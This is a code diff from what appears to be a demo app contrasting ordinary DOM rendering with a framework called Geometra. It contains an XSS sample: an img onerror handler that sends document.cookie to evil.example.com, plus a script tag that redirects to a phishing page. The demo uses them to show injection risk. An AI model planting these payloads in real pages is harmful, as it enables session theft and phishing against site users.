@@ -54,7 +54,7 @@ const DOM_PANELS: Record<Scenario, { title: string; code: string; rendered: stri
 <div class="review">
   Great product!
   <img src=x onerror="fetch('https://evil.example.com/steal?cookie='+document.cookie)">
-  <script>document.location='https://evil.example.com/phish'<\/script>
+  <script>document.location='https://evil.example.com/phish'</script>
 </div>`,
     rendered: `<div style="padding:8px;background:#1a0a0a;border:1px solid #e94560;border-radius:4px;margin-top:4px">
 <span style="color:#e94560;font-size:12px">In a real DOM app, this would execute JavaScript, steal cookies, or redirect the page. Geometra never interprets content as code.</span></div>`,
